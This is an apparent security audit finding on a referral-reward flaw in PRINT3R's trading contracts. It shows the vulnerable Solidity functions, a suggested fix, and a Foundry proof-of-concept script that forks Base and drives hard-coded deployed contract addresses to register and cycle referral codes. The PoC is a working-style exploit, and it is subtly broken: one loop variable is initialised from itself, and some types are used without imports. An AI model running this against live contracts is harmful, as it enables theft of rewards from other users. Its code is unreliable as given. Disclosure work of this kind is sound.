# A gang of traders can round-robin multiple referral codes while tricking multiple accounting of trading volume generated by referral program or upgrading multiple referrer addresses to tier-2 or tier-3 to inflate referral rewards.

## Bug Description

Referral code can be changed after associated once with a trader address. 

`PositionRouter.createIncreasePosition()` or `PositionRouter.createIncreasePositionETH()` has referral code parameter which allows to change referral code associated with `msg.sender`.

https://github.com/PRINT3Rxyz/V1-Contracts/blob/main/src/core/PositionRouter.sol#L651-L655
```
    function _setTraderReferralCode(bytes32 _referralCode) internal {
        if (_referralCode != bytes32(0) && referralStorage != address(0)) {
            IReferralStorage(referralStorage).setTraderReferralCode(msg.sender, _referralCode);
        }
    }
```

Also, anyone can create referral code by calling `ReferralStorage.registerCode()`.

https://github.com/PRINT3Rxyz/V1-Contracts/blob/main/src/referrals/ReferralStorage.sol#L77-L83
```
    function registerCode(bytes32 _code) external {
        require(_code != bytes32(0), "ReferralStorage: invalid _code");
        require(codeOwners[_code] == address(0), "ReferralStorage: code already exists");

        codeOwners[_code] = msg.sender;
        emit RegisterCode(msg.sender, _code);
    }
```

It allows a trader to be associated with multiple referrers during specific timeframe , thus tricking into multiple accounting of traffic generated by referral program or upgrading mutliple referrer codes into tier-2 or tier-3.

## Impact
A gang of traders can amplify referrer rewards multiple times, these inflated rewards can be shared among them.

It will cause protocol insolvency, dilution or loss of other user's rewards.

## Recommendation
Referral code should not be changed once associated with one address.

```
function _setTraderReferralCode(bytes32 _referralCode) internal {
-        if (_referralCode != bytes32(0) && referralStorage != address(0)) {
-            IReferralStorage(referralStorage).setTraderReferralCode(msg.sender, _referralCode);
-        }
        
+        if (_referralCode == bytes32(0)) { return; }
+        if (referralStorage == address(0)) { return; }

+        IReferralStorage _referralStorage = IReferralStorage(referralStorage);

+        // skip setting of the referral code if the user already has a referral code
+        if (_referralStorage.traderReferralCodes(msg.sender) != bytes32(0)) { return; }

+        _referralStorage.setTraderReferralCode(msg.sender, _referralCode);
    }
```

## Proof of Concept
```
pragma solidity 0.8.10;

import "forge-std/Test.sol";

interface PositionRouter {
  function createIncreasePositionETH(
        address[] memory _path,
        address _indexToken,
        uint256 _minOut,
        uint256 _sizeDelta,
        bool _isLong,
        uint256 _acceptablePrice,
        uint256 _executionFee,
        bytes32 _referralCode,
        address _callbackTarget
    ) external payable returns (bytes32);
}

interface ReferralStorage {
  function registerCode(bytes32 _code) external;
}

contract ContractTest is Test {
  PositionRouter          constant router = PositionRouter(0x6eD655C223A0E65E4C8493dCEc0585fE54e72C7d);
  ReferralStorage         constant refStorage = ReferralStorage(0xF5Ba8Cb893F81b2f4FAE65a9b559032ea2eB9689);
  address                 constant wbtc = 0xeA96c24CDeF2FB472b86eB51414e8D7cf2cA3302;
  address                 constant weth = 0x4200000000000000000000000000000000000006;

  using SafeERC20 for IERC20Metadata;

  function setUp() public {
    vm.createSelectFork("Base"); 
  }

  function testPRINT() public {
    address[] memory path = new address[](2);
    path[0] = weth;
    path[1] = wbtc;

    console.log("Creating multiple referral codes..");
    for (uint256 i = 1; i <= 3; i++) {
      bytes32 referralCode = bytes32(i);

      vm.startPrank(address(uint160(i)));
      refStorage.registerCode(referralCode);
      vm.stopPrank();
    }
    
    for (uint256 i = 1; i <= 3; i++) {
      vm.startPrank(address(uint160(i)));

      console.log("Round-robin among referral codes..");
      for (uint256 j = j; j <= 3; j++) {
        bytes32 referralCode = bytes32(j);
        router.createIncreasePositionETH{value: 10 ether}(
            path,
            wbtc,
            0,
            35689554309499200000000000000000000,
            true,
            31276847840000000000000000000000000,
            300000000000000,
            referralCode,
            0x0000000000000000000000000000000000000000
        );
      }
      vm.stopPrank();
    }
  }
}
```